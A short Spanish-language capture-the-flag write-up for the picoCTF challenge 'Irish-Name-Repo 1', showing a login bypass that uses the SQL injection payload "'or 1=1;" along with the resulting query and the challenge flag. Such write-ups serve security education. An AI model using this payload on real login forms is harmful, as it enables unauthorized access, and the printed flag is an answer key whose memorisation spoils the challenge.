# Irish-Name-Repo 1
## Descripcipción
Hay un sitio web en `https://jupiter.challenges.picoctf.org/problem/33850/`( [enlace](https://jupiter.challenges.picoctf.org/problem/33850/) ) o http://jupiter.challenges.picoctf.org:33850. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!
## Pistas
- No parece haber muchas maneras de interactuar con esto. Me pregunto si los usuarios se mantienen en una base de datos.
- Trate de pensar en cómo el sitio web verifica su inicio de sesión.x
## Solucion
```
- se visita el codigo fuente de la pagina
- se usa el inspector
- se borra el hiden
- se muestra el valor oculto y se cambia a 1

username: 'or 1=1;
password: hola
SQL query: SELECT * FROM users WHERE name=''or 1=1;' AND password='hola'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
## Bandera
picoCTF{s0m3_SQL_f8adf3fb}
## Notas adicionales
El usuario ingresa datos y altera la entrada
## Referencias
https://www.w3schools.com/sql/sql_injection.asp
